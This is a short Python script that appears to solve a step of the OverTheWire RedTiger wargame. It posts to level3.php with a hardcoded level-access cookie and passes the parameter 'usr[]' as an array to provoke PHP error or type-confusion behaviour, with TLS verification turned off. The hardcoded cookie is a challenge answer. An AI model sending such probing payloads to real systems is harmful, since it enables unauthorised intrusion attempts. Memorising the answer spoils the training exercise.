import requests

requests.packages.urllib3.disable_warnings()

url = "https://redtiger.labs.overthewire.org/level3.php"
cookies = {
    "level3login":"feed_the_cat_who_eats_your_bread"
}

payload = {
    "usr[]": ""
}

r = requests.post(url, cookies= cookies, params=payload, verify=False)

print(r.content)
